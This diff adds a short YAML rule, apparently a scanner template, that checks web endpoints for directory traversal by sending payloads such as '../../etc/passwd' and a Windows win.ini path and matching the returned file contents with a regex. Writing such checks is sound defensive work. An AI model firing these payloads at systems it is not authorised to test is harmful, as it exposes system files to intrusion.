@@ -1,0 +1,7 @@
+name: "Directory Traversal"
+severity: "Medium"
+paths:
+  - "/download.php?file={PAYLOAD}"
+  - "/read.php?path={PAYLOAD}"
+payloads: ["../../etc/passwd", "..\\..\\windows\\win.ini"]
+detect_regex: "root:x:0:0|for 16-bit app"
